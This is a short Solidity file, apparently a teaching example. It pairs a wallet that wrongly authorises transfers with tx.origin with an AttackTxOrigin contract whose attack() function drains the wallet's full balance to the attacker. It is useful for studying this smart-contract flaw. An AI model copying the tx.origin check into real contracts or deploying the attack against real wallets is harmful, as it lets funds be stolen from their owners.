pragma solidity ^0.6.10;

contract WalletWithTxOrigin {

    address public owner;
    
    event Log(address toAddress, uint amount, bool success);

    constructor() public {
        owner = msg.sender;
    }

    function deposit() public payable {}

    /*
    Alice => Wallet.transfer() (tx.origin = Alice)
    Alice => Eve's malicious contract => Wallet.transfer() (tx.origin = Alice)
    */
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        emit Log(_to, _amount, sent);
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract AttackTxOrigin {
    address payable public owner;
    WalletWithTxOrigin wallet;

    constructor(WalletWithTxOrigin _wallet) public {
        wallet = WalletWithTxOrigin(_wallet);
        owner = msg.sender;
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
